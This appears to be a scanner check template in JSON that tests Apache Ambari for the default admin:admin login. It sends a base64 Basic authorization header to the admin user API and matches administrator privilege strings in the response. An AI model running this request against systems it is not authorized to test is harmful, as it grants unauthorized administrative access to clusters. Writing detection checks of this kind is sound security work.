{
    "Name": "apache-ambari-default-password",
    "Description": "apache-ambari-default-password",
    "Product": "apache ambari",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"application/json;charset=UTF-8",
        "Authorization":"Basic YWRtaW46YWRtaW4="},
        "Uri":"/api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "PrivilegeInfo"
                }, {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "AMBARI.ADMINISTRATOR"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}